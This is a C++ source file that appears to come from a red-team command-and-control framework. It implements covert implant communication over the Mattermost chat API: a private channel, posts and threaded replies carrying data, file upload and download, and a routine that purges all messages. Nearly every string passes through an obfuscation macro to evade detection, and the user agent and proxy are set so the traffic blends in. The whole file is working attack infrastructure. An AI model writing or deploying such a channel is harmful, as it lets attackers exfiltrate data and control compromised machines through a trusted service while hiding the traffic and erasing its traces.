#include "stdafx.h"
#include "MattermostApi.h"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/WinHttp/HttpClient.h"
#include "Common/FSecure/WinHttp/Constants.h"
#include "Common/FSecure/WinHttp/Uri.h"
#include <random>
#include <set>
#include <cctype>
#include <algorithm>
#include <sstream>

using namespace FSecure::StringConversions;
using namespace FSecure::WinHttp;

FSecure::Mattermost::Mattermost(std::string serverUrl, std::string userName, std::string teamName, std::string accessToken, std::string channelName, std::string userAgent)
	: m_ServerUrl(std::move(serverUrl)), m_UserName(std::move(userName)), m_TeamName(std::move(teamName)), m_AccessToken(std::move(accessToken)), m_OriginalChannelName(std::move(channelName)), m_UserAgent(std::move(userAgent))
{
	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
		m_ProxyConfig = (winProxy == OBF(L"auto")) ? WebProxy(WebProxy::Mode::UseAutoDiscovery) : WebProxy(winProxy);

	SetTeamID(FindTeamID(m_TeamName));
	SetChannel(CreateChannel(Convert<Lowercase>(m_OriginalChannelName)));
}

void FSecure::Mattermost::SetTeamID(std::pair<std::string, std::string> const& teamID)
{
	m_TeamID = teamID.first;
	m_TeamName = teamID.second;
}

void FSecure::Mattermost::SetUserAgent(std::string const& userAgent)
{
	m_UserAgent = userAgent;
}

void FSecure::Mattermost::SetChannel(std::string const& channelId)
{
	m_ChannelID = channelId;
}

void FSecure::Mattermost::SetToken(std::string const& accessToken)
{
	m_AccessToken = accessToken;
}

std::string FSecure::Mattermost::WritePost(std::string const& message, std::string const& fileID /* = "" */)
{
	return WritePostOrReply(message, fileID);
}

std::string FSecure::Mattermost::WriteReply(std::string const& message, std::string const& postID, std::string const& fileID /* = "" */)
{
	return WritePostOrReply(message, postID, fileID);
}

std::string FSecure::Mattermost::GetUserId(std::string const& userName)
{
	if (userName.empty())
		throw std::runtime_error(OBF("[x] Empty username!\n"));

	std::string url = m_ServerUrl + OBF("/api/v4/users/") + userName;
	auto response = GetJsonResponse(url);

	if (response.value(OBF("status_code"), 0) == 400 || !response.contains(OBF("roles")))
	{
		url = m_ServerUrl + OBF("/api/v4/users/username/") + userName;
		response = GetJsonResponse(url);

		if (response.value(OBF("status_code"), 0) == 400 || !response.contains(OBF("roles")))
		{
			throw std::runtime_error(OBF("[x] Could not find user specified by neither ID nor username!\n"));
		}
	}

	return response[OBF("id")];
}

std::string FSecure::Mattermost::WritePostOrReply(std::string const& message, std::string const& postID /*= ""*/, std::string const& fileID /*= ""*/, std::string channelID /*= ""*/)
{
	json j;

	j[OBF("channel_id")] = (channelID.empty())? m_ChannelID : channelID;
	j[OBF("message")] = message;
	j[OBF("root_id")] = postID;

	if (fileID.empty())
	{
		j[OBF("file_ids")] = std::vector<std::string>();
	}
	else
	{
		j[OBF("file_ids")] = { fileID };
	}

	j[OBF("props")] = std::map<std::string, std::string>();
	
	std::string url = m_ServerUrl + OBF("/api/v4/posts");

	json output = SendJsonRequest(url, j, Method::POST);

	return (output.contains(OBF("detailed_error")) && output.contains(OBF("status_code")) && output.value(OBF("status_code"), 0) == 400) ?
		std::string{} :
		output[OBF("id")].get<std::string>();
}

std::pair<std::string, std::string> FSecure::Mattermost::FindTeamID(const std::string& teamName)
{
	unsigned int channelNum = 0;
	std::map<std::string, std::string> channelMap;
	json response;

	std::string userId = GetUserId(m_UserName);
	std::string url;

	if (!userId.empty())
	{
		url = m_ServerUrl + OBF("/api/v4/users/") + userId + OBF("/teams");
		response = GetJsonResponse(url);
		
		for (auto& team : response)
		{
			std::string teamId = team[OBF("id")];
			std::string cName = team[OBF("name")];

			if (cName == teamName || teamId == teamName)
			{
				return std::make_pair(teamId, cName);
			}
		}
	}

	do
	{
		std::string channelNums = std::to_string(channelNum);
		url = m_ServerUrl + OBF("/api/v4/teams?page=") + channelNums + OBF("&per_page=30&include_total_count=true");

		response = GetJsonResponse(url);
		channelNum++;

		if (!response.contains(OBF("teams")) || response[OBF("teams")].empty())
		{
			break;
		}

		auto& teams = response[OBF("teams")];

		for (auto& team : teams)
		{
			std::string teamId = team[OBF("id")];
			std::string cName = team[OBF("name")];

			if (cName == teamName || teamId == teamName)
			{
				return std::make_pair(teamId, cName);
			}
		}

	} while (response.contains(OBF("teams")));

	throw std::runtime_error(OBF("[x] Could not find Team specified by ID.\n"));
}


std::map<std::string, std::string> FSecure::Mattermost::ListChannels()
{
	std::map<std::string, std::string> channelMap;
	std::string url = m_ServerUrl + OBF("/api/v4/channels?exclude_default_channels=true");

	json response = GetJsonResponse(url);

	for (auto &channel : response)
	{
		std::string teamId = channel[OBF("team_id")];
		std::string cName = channel[OBF("name")];
		std::string cId = channel[OBF("id")].get<std::string>();

		if (teamId != m_TeamID)
		{
			continue;
		}
		
		channelMap.insert({ cName, cId });
	}

	return channelMap;
}



std::string FSecure::Mattermost::CreateChannel(std::string const& channelName)
{
	std::string url = m_ServerUrl + OBF("/api/v4/teams/name/") + m_TeamName + OBF("/channels/name/") + channelName;

	json response = GetJsonResponse(url);

	if (!response.contains(OBF("status_code")) && response.contains(OBF("id")) && response.contains(OBF("name")))
	{
		return response[OBF("id")].get<std::string>();
	}
	else if (response.contains(OBF("status_code")) && (response[OBF("status_code")] == 403))
	{
		throw std::runtime_error(OBF("Throwing exception: unable to access specified channel, got 403 Forbidden\n"));
	}
	else if (response.contains(OBF("status_code")) && (response[OBF("status_code")] == 404))
	{
		json j;
		url = m_ServerUrl + OBF("/api/v4/channels");
		j[OBF("team_id")] = m_TeamID;
		j[OBF("name")] = channelName;
		j[OBF("display_name")] = channelName;
		j[OBF("purpose")] = "";
		j[OBF("header")] = "";

		// O - for public channel, P - for private channel.
		j[OBF("type")] = OBF("P");

		json response = SendJsonRequest(url, j, Method::POST);

		if (response.contains(OBF("id")) && response.contains(OBF("team_id")) && response.contains(OBF("name")))
		{
			return response[OBF("id")].get<std::string>();
		}
		else
		{
			throw std::runtime_error(OBF("Throwing exception: unable to create a channel\n"));
		}
	}
	else
	{
		throw std::runtime_error(OBF("Throwing exception: got unexpected result while searching for a channel!\n"));
	}

	return "";
}


std::vector<std::pair<std::string, std::string>> FSecure::Mattermost::ReadReplies(std::string const& postID)
{
	if (postID.empty())
		return {};

	std::string url = m_ServerUrl + OBF("/api/v4/posts/") + postID + OBF("/thread");
	json output = GetJsonResponse(url);

	//This logic is really messy, in reality the checks are over cautious, however there is an edge case
	//whereby a message could be created with no replies of the implant that wrote triggers an exception or gets killed.
	//If that was the case, and we didn't sanity check, we could run into problems.
	if (!output.contains(OBF("posts")) || !output.contains(OBF("order")))
		return {};

	auto& order = output[OBF("order")].get<std::vector<std::string>>();
	json const& posts = output[OBF("posts")];

	if (posts.empty() || posts.front().value(OBF("reply_count"), 0) == 0)
		return {};

	std::vector<std::pair<std::string, std::string>> ret;
	std::set<std::string> postIDs;

	for (const auto& orderPostID : order) 
	{
		if (orderPostID == postID) continue;

		json postData = posts[orderPostID];

		if (!postData.contains(OBF("root_id"))) continue;

		std::string rootID = postData[OBF("root_id")].get<std::string>();
		std::string thisPostID = postData[OBF("id")].get<std::string>();
		std::string_view data = postData[OBF("message")].get<std::string_view>();

		if (rootID.empty() || rootID == thisPostID)
		{
			//skip the first message (parent message) (it doesn't contain the data we want).
			continue;
		}

		if (postIDs.find(orderPostID) != postIDs.end())
		{
			// this element was already appended to the messages list. skip it.
			continue;
		}

		bool gotFiles = false;

		if (postData.contains(OBF("metadata")) && postData[OBF("metadata")].contains(OBF("files")))
		{
			json file = postData[OBF("metadata")][OBF("files")].get<json>();
			if (file.size() > 0)
			{
				gotFiles = true;
				json files = file;
				std::string message;

				for (const auto& fileData : files)
				{
					std::string fileID = fileData[OBF("id")].get<std::string>();
					std::string text = GetFile(fileID);
					message.append(text);
				}

				postIDs.insert(thisPostID);
				ret.emplace_back(std::move(thisPostID), std::move(message));
			}
		}

		if(!gotFiles)
		{
			std::string text = postData[OBF("message")];
			postIDs.insert(thisPostID);
			ret.emplace_back(std::move(thisPostID), std::move(text));
		}
	}

	return ret;
}

std::vector<std::string> FSecure::Mattermost::GetMessagesByDirection(std::string const& direction, std::string channelID /*= ""*/)
{
	std::vector<std::string> ret;
	std::vector<std::string> order;
	std::vector<std::pair<std::string, std::uint32_t>> unsortedMessages;
	std::string cursor;
	std::set<std::string> postIDs;

	json resp;
	size_t pageCount = 0;

	if (channelID.empty()) 
		channelID = m_ChannelID;

	do
	{
		std::string url = m_ServerUrl + OBF("/api/v4/channels/") + channelID + OBF("/posts?per_page=200&page=");
		url.append(std::to_string(pageCount++));

		//Actually send the http request and grab the messages
		resp = GetJsonResponse(url);

		if (!resp.contains(OBF("posts")) || !resp.contains(OBF("order")))
			break;

		order = resp[OBF("order")].get<std::vector<std::string>>();
		auto& posts = resp[OBF("posts")];

		for (const auto& orderPostID : order)
		{
			json postData = posts[orderPostID];

			std::string_view data = postData[OBF("message")].get<std::string_view>();
			uint32_t timestamp = postData[OBF("create_at")].get<uint32_t>();

			if (postIDs.find(orderPostID) != postIDs.end())
			{
				// this element was already appended to the messages list. skip it.
				continue;
			}

			//make sure it's a message we care about
			if (data == direction || direction.empty())
			{
				unsortedMessages.emplace_back(std::make_pair(orderPostID, timestamp));
				postIDs.insert(orderPostID);
			}
		}
	} while (resp.contains(OBF("order")) && !order.empty());

	// Now we sort collected replies in order of their create timestamp, oldest first.
	std::sort(unsortedMessages.begin(), unsortedMessages.end(), [](const auto& p1, const auto& p2) -> bool {
		return (p1.second < p2.second);
	});

	for (const auto& v : unsortedMessages) {
		ret.emplace_back(v.first);
	}

	return ret;
}

void FSecure::Mattermost::UpdatePost(std::string const& message, std::string const& postID)
{
	if (postID.empty())
		return;

	const std::string url = m_ServerUrl + OBF("/api/v4/posts/") + postID + OBF("/patch");

	json j;
	j[OBF("message")] = message;

	SendJsonRequest(url, j, Method::PUT);
}


void FSecure::Mattermost::DeletePost(std::string const& postID)
{
	if (postID.empty())
		return;

	std::string url = m_ServerUrl + OBF("/api/v4/posts/") + postID;
	SendJsonRequest(url, {}, Method::DEL);
}


void FSecure::Mattermost::PurgeChannel()
{
	auto messages = GetMessagesByDirection("", m_ChannelID);

	for (auto&& postID : messages)
	{
		try
		{
			// Already-deleted post may still be present in PostgreSQL and returned during posts-collection.
			// Deleting previously-removed post will return 403 which in turn throws exception. Carry on if that happens...
			DeletePost(postID);
		}
		catch (...)
		{
		}
	}
}


FSecure::ByteVector FSecure::Mattermost::SendHttpRequest(
	std::string const& host, 
	FSecure::WinHttp::Method method, 
	std::optional<WinHttp::ContentType> contentType /* = {} */, 
	std::string const& data /* = "" */
)
{
	auto m = Convert<std::string>(GetMethodString(method));

	while (true)
	{
		HttpClient webClient(Convert<std::wstring>(host), m_ProxyConfig);
		HttpRequest request;

		request.m_Method = method;

		if (!data.empty())
		{
			request.SetData(*contentType, { data.begin(), data.end() });
		}

		request.SetHeader(Header::Authorization, OBF(L"Bearer ") + Convert<std::wstring>(m_AccessToken));
		request.SetHeader(Header::UserAgent, Convert<std::wstring>(m_UserAgent));

		auto resp = webClient.Request(request);

		if (resp.GetStatusCode() == StatusCode::OK || resp.GetStatusCode() == StatusCode::Created)
		{
			return resp.GetData();
		}
		else if (resp.GetStatusCode() == StatusCode::TooManyRequests)
		{
			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
		}
		else if (resp.GetStatusCode() == StatusCode::BadRequest || resp.GetStatusCode() == StatusCode::NotFound || resp.GetStatusCode() == StatusCode::Forbidden)
		{
			return resp.GetData();
		}
		else
		{
			throw std::runtime_error(OBF("[x] Unexpected HTTP Response status code: ") + std::to_string(resp.GetStatusCode()));
		}
	}
}

FSecure::ByteVector FSecure::Mattermost::SendHttpRequest(std::string const& host, std::optional<WinHttp::ContentType> contentType /* = {} */, std::string const& data /* = "" */)
{
	FSecure::WinHttp::Method method = Method::GET;

	if (contentType && !data.empty())
	{
		method = Method::POST;
	}

	return SendHttpRequest(host, method, contentType, data);
}

json FSecure::Mattermost::SendJsonRequest(std::string const& url, json const& data, FSecure::WinHttp::Method method /* Method::GET */)
{
	auto m = Convert<std::string>(GetMethodString(method));

	auto out = SendHttpRequest(url, method, ContentType::ApplicationJson, data.dump());
	json outj;

	try
	{
		outj = json::parse(out);
		return outj;
	}
	catch (...)
	{
		throw std::runtime_error(OBF("[x] SendJsonRequest(") + url + OBF("): could not parse JSON response."));
	}
}

json FSecure::Mattermost::GetJsonResponse(std::string const& url)
{
	auto out = SendHttpRequest(url);
	json outj;

	try
	{
		outj = json::parse(out);
		return outj;
	}
	catch (...)
	{
		throw std::runtime_error(OBF("GetJsonResponse(") + url + OBF("): could not parse JSON response."));
	}
}

std::string FSecure::Mattermost::UploadFile(ByteView data)
{
	std::string url = m_ServerUrl + OBF("/api/v4/files");

	std::wstring wboundary = FSecure::Utils::GenerateRandomString<std::wstring>(15);
	std::string boundary = Convert<std::string>(wboundary);
	std::wstring wcontentType = GetContentType(ContentType::MultipartFormData) + OBF(L"; boundary=----WebKitFormBoundary") + wboundary;
	
	std::string cFilename = FSecure::Utils::GenerateRandomString(16) + "." + FSecure::Utils::GenerateRandomString(3);
	std::string dataString(data.begin(), data.end());

	std::string formData = "";
	formData += OBF("------WebKitFormBoundaryBOUNDARY\r\n");
	formData += OBF("Content-Disposition: form-data; name=\"files\"; filename=\"FILE_NAME\"\r\n");
	formData += OBF("Content-Type: text/plain\r\n\r\n");
	formData += OBF("FILE_DATA\r\n");
	formData += OBF("------WebKitFormBoundaryBOUNDARY\r\n");
	formData += OBF("Content-Disposition: form-data; name=\"channel_id\"\r\n\r\n");
	formData += OBF("CHANNEL_ID\r\n");
	formData += OBF("------WebKitFormBoundaryBOUNDARY--\r\n");

	Utils::ReplaceString(formData, OBF("FILE_NAME"), cFilename);
	Utils::ReplaceString(formData, OBF("CHANNEL_ID"), m_ChannelID);
	Utils::ReplaceString(formData, OBF("BOUNDARY"), boundary);
	Utils::ReplaceString(formData, OBF("FILE_DATA"), dataString);

	ByteView rawData(formData.data());
	
	while (true)
	{
		HttpClient webClient(Convert<std::wstring>(url), m_ProxyConfig);
		HttpRequest request;

		request.m_Method = Method::POST;

		request.SetData(wcontentType, { rawData.begin(), rawData.end() });
		request.SetHeader(Header::Authorization, OBF(L"Bearer ") + Convert<std::wstring>(m_AccessToken));
		request.SetHeader(Header::UserAgent, Convert<std::wstring>(m_UserAgent));

		auto resp = webClient.Request(request);

		if (resp.GetStatusCode() == StatusCode::OK || resp.GetStatusCode() == StatusCode::Created)
		{
			auto out = json::parse(ByteVector(resp.GetData()));
			return out[OBF("file_infos")][0][OBF("id")];
		}
		else if (resp.GetStatusCode() == StatusCode::TooManyRequests)
		{
			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
		}
		else
		{
			throw std::runtime_error(OBF("[x] Unexpected response status code returned while uploading file: HTTP ") + std::to_string(resp.GetStatusCode()));
		}
	}

	return "";
}


std::string FSecure::Mattermost::GetFile(std::string const& fileID)
{
	std::string url = m_ServerUrl + OBF("/api/v4/files/") + fileID + OBF("/link");
	auto out = GetJsonResponse(url);

	if (!out.contains(OBF("link")))
		return {};

	std::string fileUrl = out[OBF("link")];
	auto data = SendHttpRequest(fileUrl);
	return { data.begin(), data.end() };
}
